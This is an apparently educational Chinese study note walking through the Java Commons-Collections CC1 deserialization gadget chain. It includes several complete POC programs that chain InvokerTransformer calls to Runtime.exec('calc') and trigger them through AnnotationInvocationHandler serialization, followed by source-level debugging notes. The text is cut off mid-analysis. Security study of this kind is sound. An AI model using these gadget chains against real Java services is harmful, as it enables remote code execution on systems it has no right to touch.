# 1.前言
**注意：需要边看边实操！**
**必看** ：
  * 先看：[Java反序列化Commons-Collections篇01-CC1链](https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-2) 进行实操
  * 实操完回顾：[Java安全漫谈 - 09.初识CommonsCollections](https://t.zsxq.com/BmIIAy3) , [Java安全漫谈 - 10.用TransformedMap编写真正的POC](https://t.zsxq.com/ZNZrJMZ), [CommonsCollections1笔记](https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsCollections1/CommonsCollections1.md)
  * 视频讲解：[Java反序列化CommonsCollections篇(一) CC1链手写EXP](https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=1133eb6c801917b16b324ad28ad16d2e)
### 环境搭建
1.
2.JDK下载地址：
下载通用密码：8899
（别从博客那个链接下，那个下载的8u65实际上是8u111，后面的实验会做不了）
* * *
## Code：
**第二部分.java:**
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Map;
    import java.lang.reflect.Method;
    public class CommonCollections1 {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
            Runtime runtime = Runtime.getRuntime();
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                    , new Class[]{String.class}, new Object[]{"calc"});
            HashMap hashMap = new HashMap<>();
            hashMap.put("key", "value");
            Map transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
            for (Map.Entry entry : transformedMap.entrySet()) {
                entry.setValue(runtime);
            }
        }
    }
**第三部分.java**
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Map;
    import java.lang.reflect.Method;
    public class CommonCollections1 {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
            Runtime runtime = Runtime.getRuntime();
            Map map = new HashMap();
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}
                    , new Object[]{"C:\\WINDOWS\\system32\\calc.exe"});
            Map tranformedMap = TransformedMap.decorate(map, null, invokerTransformer);
            Class transformedMapClass = Class.forName("org.apache.commons.collections.map.TransformedMap");
            Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
            checkSetValueMethod.setAccessible(true);
            checkSetValueMethod.invoke(tranformedMap, runtime);
        }
    }
**第一个问题.java**
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Map;
    import java.lang.reflect.Method;
    public class CommonCollections1 {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException {
            Transformer[] transformers = new Transformer[]{
                    new InvokerTransformer("getMethod"
                            , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke"
                            , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec"
                            , new Class[]{String.class}, new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            chainedTransformer.transform(Runtime.class);    // 这一句是触发命令执行的关键核心,需要找方法去替代这条语句
            // 分割线
            HashMap hashMap = new HashMap<>();
            hashMap.put("key", "value");
            Map decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
            for (Map.Entry entry : decorateMap.entrySet()) {
                entry.setValue(Class.forName("java.lang.reflect").getMethod("getRuntime"));
            }
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructorAnnotationInvocationHandlerClass  = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
            constructorAnnotationInvocationHandlerClass.setAccessible(true);
            Object o =  constructorAnnotationInvocationHandlerClass.newInstance(Override.class,decorateMap);
            serialize(o);
            unserialize("ser.bin");
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
**理想情况.java**
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.map.TransformedMap;  
    import java.io.*;  
    import java.lang.reflect.Constructor;  
    import java.util.HashMap;  
    import java.util.Map;  
    public class CommonCollections1 {  
        public static void main(String[] args) throws Exception{  
            Runtime runtime = Runtime.getRuntime();  
     InvokerTransformer invokerTransformer = new InvokerTransformer("exec"  
     , new Class[]{String.class}, new Object[]{"calc"});  
     HashMap hashMap = new HashMap<>();  
     hashMap.put("key", "value");  
     Map transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
     Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
     Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
     aihConstructor.setAccessible(true);  
     Object o = aihConstructor.newInstance(Override.class, transformedMap);  
     // 序列化反序列化  
     serialize(o);  
     unserialize("ser.bin");  
     }  
        public static void serialize(Object obj) throws IOException {  
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
     oos.writeObject(obj);  
     }  
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
     Object obj = ois.readObject();  
     return obj;  
     }  
    }
* * *
# 2.链子按功能切割
( **JDK 8U71之前的版本能触发** )
这里 **将链子分为三部分** ，各部分的作用：
  * 第三部分：链尾，用于命令执行
  * 第二部分：传导
  * 第一部分：触发，即寻找调用了readObject的地方
## 2.1 **第三部分的chain:**
(这里的`1,2,3`只是参数1，参数2，参数3的意思,下同)
先初始化:
    TransformedMap.decorate(1,2,3)  静态方法
        TransformedMap.TransformedMap(1,2,3)
再调用 **TransformedMap.checkSetValue()** 去激活 **TransformedMap.transform()**
,从而达到命令执行的目的
**为什么需要 hashMap对象** ：为了构造 `TransformedMap.decorate()`方法，它要什么参数就给它什么参数
### 命令执行的关键
`InvokerTransformer`这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。
在实例化这个`InvokerTransformer`时，需要传⼊三个参数，
第⼀个参数是待执行的方法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表
`InvokerTransformer`类的`transform`方法中用到了反射，只要传参进去就能反射加载对应的方法
关键地方：
    try {
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
    }
### 为什么要去找调用 `transform` 方法的不同名函数
为了调用checkSetValue函数时，能触发 `valueTransformer.transform(value)`
从而形成 **InvokerTransformer.transform()** ，也就达成了命令执行的目的 **（参见[命令执行的关键]）**
    protected Object checkSetValue(Object value) {
           return valueTransformer.transform(value);
        }
POC对应语句：
    checkSetValueMethod.invoke(tranformedMap, runtime);
详情代码查看 **[第三部分.java]**
* * *
## 2.2第二部分的Chain
  * 前言：[何为抽象类](https://www.runoob.com/java/java-abstraction.html)
### 思考这句话有什么错误？：
我们在进行 `TransformedMap.decorate` 方法调用，进行 Map 遍历的时候，就会走到 `setValue()` 当中，而
`setValue()` 就会调用 `checkSetValue` —— [Java反序列化Commons-Collections篇01-CC1链](https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-2)
其实博客原文的这句话应该拆开来看：
**解答：**
1.首先请仔细看 **TransformedMap的类继承关系:**
2.为什么执行`TransformedMap.decorate`方法调用，会进行 Map 遍历？：
2-1. 我分析得出的结论： **这句话是错的** ，其实并不会进行Map遍历
2-2. 为什么不会进行Map遍历：
`TransformedMap.decorate`方法：
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
`TransformedMap`构造方法：
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
            super(map);
            this.keyTransformer = keyTransformer;
            this.valueTransformer = valueTransformer;
        }
是因为`TransformedMap`构造方法使用了 **super(map)**
,且`AbstractInputCheckedMapDecorator`也使用了
**super(map)(参见[TransformedMap的类继承关系])** ,最终导致调用了Map,但 **并没有进行遍历Map**
3.当时我看博客我所不解的地方：
`AbstractMapDecorator`类中并无实现`setValue()`方法，它只是实现了Map接口，但它是如何实现
**{走到`setValue()`当中}** 的呢？
    public AbstractMapDecorator(Map map) {
        if (map == null) {
            throw new IllegalArgumentException("Map must not be null");
        }
        this.map = map;
    }
所以我进行了如下调试：
前言部分：
  * **entrySet解释：**
**每一个键值对也就是一个Entry**
entrySet是 java中键-值对的集合，Set里面的类型是`Map.Entry`，一般可以通过`map.entrySet()`得到。
详情代码查看 **[第二部分.java]**
第二部分核心代码中有一句能够 **把键值取出来** 的核心代码：
因此我们重点调试这个 核心代码
    for (Map.Entry entry:decorateMap.entrySet()){
                entry.setValue(runtime);
            }
AbstractInputCheckedMapDecorator.entrySet()：
    public Set entrySet() {
            if (isSetValueChecking()) {
                return new EntrySet(map.entrySet(), this);
            } else {
                return map.entrySet();
            }
        }
AbstractInputCheckedMapDecorator.EntrySet.EntrySet()：
    protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
        super(set);
        this.parent = parent;
    }
这里就将 TransformedMap类型的 parent 传递给了 this.parent
**为什么是 TransformedMap类型** ，
而不是 AbstractInputCheckedMapDecorator类型 ，是因为 AbstractInputCheckedMapDecorator
是抽象类所以不能实例化只能让它的 **非抽象类子类** 实例化 **(参见[TransformedMap的类继承关系])**
然后继续F7跟进，直到来到这：(跳过了一些无关紧要的map操作)。
AbstractInputCheckedMapDecorator.EntrySetIterator.next：
    public Object next() {
        Map.Entry entry = (Map.Entry) iterator.next();
        return new MapEntry(entry, parent);
    }
关键是 `return new MapEntry(entry, parent);` 这句， MapEntry 是
AbstractInputCheckedMapDecorator 的内部类 。